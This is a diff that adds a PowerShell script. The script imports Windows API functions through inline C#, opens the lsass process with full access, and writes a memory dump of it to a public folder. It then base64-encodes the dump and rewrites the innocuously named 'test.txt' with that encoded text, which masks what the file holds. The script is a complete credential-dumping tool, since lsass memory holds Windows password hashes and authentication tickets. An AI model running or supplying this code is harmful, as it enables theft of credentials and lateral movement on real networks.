@@ -1,0 +1,49 @@
+$MyClass = @"
+using System;
+using System.Runtime.InteropServices;
+
+public class MyClass {
+    [DllImport("Dbghelp.dll")]
+    public static extern bool MiniDumpWriteDump(IntPtr hProcess, int ProcessId, IntPtr hFile, int DumpType, IntPtr ExceptionParam, IntPtr UserStreamParam, IntPtr CallbackParam);
+
+    [DllImport("kernel32.dll")]
+    public static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int processId);
+}
+"@
+
+Add-Type $MyClass
+
+$lsass_pid = (Get-Process -Name "lsass").Id
+
+$dumpFile = New-Object System.IO.FileStream("C:\users\public\test.txt", [System.IO.FileMode]::Create)
+$safeHandle = $dumpFile.SafeFileHandle
+$dangerousHandle = $safeHandle.DangerousGetHandle()
+
+$handle = [MyClass]::OpenProcess(0x001F0FFF, $false, $lsass_pid)
+
+$dumped = [MyClass]::MiniDumpWriteDump($handle, $lsass_pid, $dangerousHandle, 2,[IntPtr]::Zero, [IntPtr]::Zero,[IntPtr]::Zero)
+
+# Go to the beginning of the stream
+$dumpFile.Seek(0, [System.IO.SeekOrigin]::Begin) > $null
+
+# Read the contents of the file into a byte array
+$bytes = New-Object byte[] $dumpFile.Length
+$dumpFile.Read($bytes, 0, $bytes.Length)
+
+# Convert the byte array to base64
+$base64 = [Convert]::ToBase64String($bytes)
+
+# Go to the beginning of the stream again
+$dumpFile.SetLength(0)
+$dumpFile.Seek(0, [System.IO.SeekOrigin]::Begin) > $null
+
+# Write the new content to the file
+$sw = New-Object System.IO.StreamWriter($dumpFile)
+$sw.Write($base64)
+$sw.Flush()
+
+# Close the file
+$dumpFile.Close()
+
+# Print the base64 string
+#Write-Host $base64
